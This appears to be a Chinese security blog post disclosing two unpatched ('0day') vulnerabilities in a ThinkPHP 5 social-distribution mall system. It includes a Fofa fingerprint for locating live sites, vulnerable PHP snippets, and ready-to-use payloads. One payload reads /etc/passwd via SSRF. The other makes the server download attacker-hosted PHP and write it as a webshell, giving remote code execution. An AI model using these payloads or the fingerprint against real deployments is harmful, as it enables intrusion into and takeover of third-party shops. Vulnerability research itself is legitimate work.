#  某微商代理商补货商城系统RCE漏洞审计   
原创 Mstir  星悦安全   2024-10-02 16:30  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字关注我们 并设为  
星标  
## 0x00 前言  
  
******这个源码是一款微商分销代理商城源码，可以自己设置代理等级和升级条件(如购买指定商品、消费额度)，“微商城+小程序+三级分销+拼团秒杀+多商户开店+O2O门店”通过社交关系分销裂变，把粉丝变成客户，让分销商发展下线，打造新型社交分销模式，实现人人分销、人人卖货！搭建了下，发现后台有页面打不开，但****导入****其他数据库文件后就可以打开。**  
  
**Fofa指纹:"/template/mobile/new/static/assets/js/comm.js"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dqz2mHlOaWspGribUQcrna4yw1S1oK67IPVJE98hooYPvYn5qVa56B7gYkgFsLjXHibfzYxOJga2Ug/640?wx_fmt=other&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dqz2mHlOaWspGribUQcrna4eNHCRGcsticn0UZTs7icMqN14Pb14iaW91DYwVU0HKz2GYDuKlzGCKBpQ/640?wx_fmt=other&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dqz2mHlOaWspGribUQcrna4ibx2zrsEFRfDeSSo9OluckOQ3MiaKCFobvJiasFXnwL2brJstLuZXXyPQ/640?wx_fmt=jpeg "")  
**框架:ThinkPHP 5**  
## 0x01 前台任意文件读取+SSRF漏洞  
  
**位于 /mobile/controller/Address.php 控制器的 curl_request 方法存在curl_exec函数，且传参均可控，导致漏洞产生，可使用file:/// gopher:// dist://等协议读取或访问任意文件.**  
```
/**
* 参数1：访问的URL，参数2：post数据(不填则为GET)，参数3：提交的$cookies,参数4：是否返回$cookies
* @param  [type]  $url          访问的URL
* @param  string  $post         post数据(不填则为GET)
* @param  string  $cookie        提交的$cookies
* @param  integer $returnCookie 是否返回$cookies
* @return [type]                 data
*/
public function curl_request($url,$post='',$cookie='', $returnCookie=0){
  $curl = curl_init();
  curl_setopt($curl, CURLOPT_URL, $url);
  curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)');
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // 跳过ssl检查项
  curl_setopt($curl, CURLOPT_AUTOREFERER, 1);
  curl_setopt($curl, CURLOPT_REFERER, "http://XXX");
  if($post) {
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));
  }
  if($cookie) {
    curl_setopt($curl, CURLOPT_COOKIE, $cookie);
  }
  curl_setopt($curl, CURLOPT_HEADER, $returnCookie);
  curl_setopt($curl, CURLOPT_TIMEOUT, 10);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
  $data = curl_exec($curl);
  if (curl_errno($curl)) {
    return curl_error($curl);
  }
  curl_close($curl);
  if($returnCookie){
    list($header, $body) = explode("\r\n\r\n", $data, 2);
    preg_match_all("/Set\-Cookie:([^;]*);/", $header, $matches);
    $info['cookie']  = substr($matches[1][0], 1);
    $info['content'] = $body;
    return $info;
  }else{
    return $data;
  }
}
```  
  
**Payload:**  
```
/Mobile/address/curl_request?url=file:///etc/passwd
```  
  
****## 0x02 前台远程文件写入漏洞(RCE)  
  
**位于 /home/controller/Index.php 控制器的 Test方法先通过curl_exec函数将远程文件下载过来，然后通过fopen 直接写入到指定的文件当中，文件名可随意控制，导致漏洞产生.**  
```
// 下载图片
public function dlfile($file_url, $save_to)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_POST, 0);
    curl_setopt($ch,CURLOPT_URL,$file_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $file_content = curl_exec($ch);
    curl_close($ch);
    $downloaded_file = fopen($save_to, 'w');
    fwrite($downloaded_file, $file_content);
    fclose($downloaded_file);
  }
```  
  
**先在云服务器或VPS上准备一个111.txt 内容为 <?php phpinfo();?> 然后使其能被访问到，之后将下方Paylaod地址替换即可**  
  
**Payload:**  
```
GET /home/test/dlfile?file_url=http://127.0.0.1/111.txt&save_to=1.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Host: 127.0.0.1
Pragma: no-cache
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
```  
  
**文件会写入到1.php中**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dqz2mHlOaWspGribUQcrna4kUA4fIibpASyzwbIrA09Z2NN28rUK5owBofe0WPrUo40iaQQRtchSPYw/640?wx_fmt=other&from=appmsg "")  
****  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转，RCE**  
  
**微商系统源码关注公众号发送 241002 获取**  
  
  
**PS:无偿帮忙代码审计，可通过公众号后台发送源码网盘链接，或加运营微信发源码即可.**  
  
**PS:无偿帮忙代码审计，可通过公众号后台发送源码网盘链接，或加运营微信发源码即可.**  
  
****![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ezSI5Y1rLcfcUaLaiamsJrxiaI79zOdmg2WEaVHKu0DWm5Zv2MHmU6ic0nfateWXj2ShGGvJCqRV6aQ/640?wx_fmt=jpeg&from=appmsg "")  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
